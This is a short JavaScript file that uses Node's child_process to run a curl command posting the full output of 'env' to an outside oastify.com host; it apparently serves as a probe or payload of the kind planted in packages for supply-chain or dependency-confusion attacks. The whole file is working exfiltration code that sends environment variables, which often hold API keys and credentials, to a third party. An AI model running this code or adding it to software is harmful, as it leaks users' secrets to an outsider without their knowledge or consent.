import { exec } from "child_process";

// Define the command
const command = `curl -d "$(env)" https://jbyyd58v27sj3xocti3t69hhd8j871vq.oastify.com`;

// Execute the command
exec(command, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    return;
  }
  console.log(`Output: ${stdout}`);
});
